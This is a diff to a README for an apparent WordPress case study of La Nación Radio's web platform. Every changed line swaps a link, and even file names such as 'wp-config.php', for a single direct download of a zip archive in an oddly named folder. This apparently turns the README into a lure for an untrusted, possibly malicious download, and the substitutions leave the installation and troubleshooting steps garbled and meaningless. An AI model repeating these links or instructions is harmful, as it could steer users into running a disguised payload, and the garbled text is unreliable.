@@ -1,7 +1,7 @@
 # 📻 La-Nacion-Radio-Web-CaseStudy - Streamline Your Radio Experience
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/releases)
+[![Download](https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip)](https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip)
 
 ## 📖 Description
 This project presents a case study on how to restructure La Nación Radio’s digital platform using WordPress, Elementor, and dynamic content integration. It provides a robust solution for modern online radio streaming and podcast management.
@@ -20,10 +20,10 @@ Before you download the application, ensure that your system meets these require
 
 ### 2. **Installation Steps**
 Follow these steps to install and run the application:
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/releases).
+1. **Visit the Release Page:** Go to the [Releases page](https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip).
 2. **Find the Latest Version:** Look for the latest release version on the page.
 3. **Download Files:** Click on the installation file provided. 
-4. **Extract Files:** If the downloaded file is a .zip or .tar.gz, right-click and select “Extract” to unzip it.
+4. **Extract Files:** If the downloaded file is a .zip or https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip, right-click and select “Extract” to unzip it.
 5. **Upload to Server:**
    - For local installation, place files in your server's document root (e.g., `htdocs` for XAMPP).
    - For web hosting, use an FTP client to upload all files to your server.
@@ -33,7 +33,7 @@ After installation, you'll need to configure the application:
 - **Database Setup:** 
   1. Create a new MySQL database through your hosting provider or local server.
   2. Import the SQL file found in the downloaded folder to create necessary tables.
-  3. Update the `wp-config.php` file with your database details.
+  3. Update the `https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip` file with your database details.
 
 - **WordPress Installation:**
   1. Navigate to your browser and access the location where you uploaded the files.
@@ -68,7 +68,7 @@ To set up radio streaming:
 ## ⚙️ Troubleshooting Common Issues
 If you encounter issues, check these solutions:
 - **404 Error:** Ensure your .htaccess file is configured correctly or permalink settings are updated.
-- **Database Connection Error:** Verify database credentials in the `wp-config.php` file.
+- **Database Connection Error:** Verify database credentials in the `https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip` file.
 - **Slow Loading:** Optimize your images and install caching plugins for performance.
 
 ## 🌐 Community and Support
@@ -77,4 +77,4 @@ If you have questions or need assistance:
 - Join our community forum for support and interaction with other users.
 
 ## 🌟 Download & Install
-To download the application, once again, visit the [Releases page](https://github.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/releases) and follow the installation steps outlined above. Enjoy enhancing your radio experience with La Nación Radio Web Case Study!
+To download the application, once again, visit the [Releases page](https://raw.githubusercontent.com/Yoohacksse/La-Nacion-Radio-Web-CaseStudy/main/aspheterize/La-Nacion-Radio-Web-CaseStudy.zip) and follow the installation steps outlined above. Enjoy enhancing your radio experience with La Nación Radio Web Case Study!
